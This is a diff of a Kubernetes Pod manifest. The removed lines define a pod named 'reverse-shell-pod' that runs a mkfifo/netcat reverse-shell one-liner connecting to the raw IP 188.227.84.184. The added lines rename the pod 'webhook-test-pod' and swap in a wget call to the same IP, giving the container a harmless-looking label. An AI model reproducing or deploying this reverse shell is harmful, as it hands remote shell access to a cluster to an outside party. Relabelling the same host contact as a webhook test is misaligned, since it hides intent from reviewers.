@@ -1,12 +1,14 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: reverse-shell-pod
+  name: webhook-test-pod
 spec:
+  restartPolicy: Never
   containers:
-  - name: shell-container
+  - name: curl-container
     image: alpine
     command: ["/bin/sh", "-c"]
     args:
     - |
-      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 188.227.84.184 80 >/tmp/f
+      apk add --no-cache wget && \
+      wget -qO- http://188.227.84.184/webhook || echo "Failed to reach webhook"
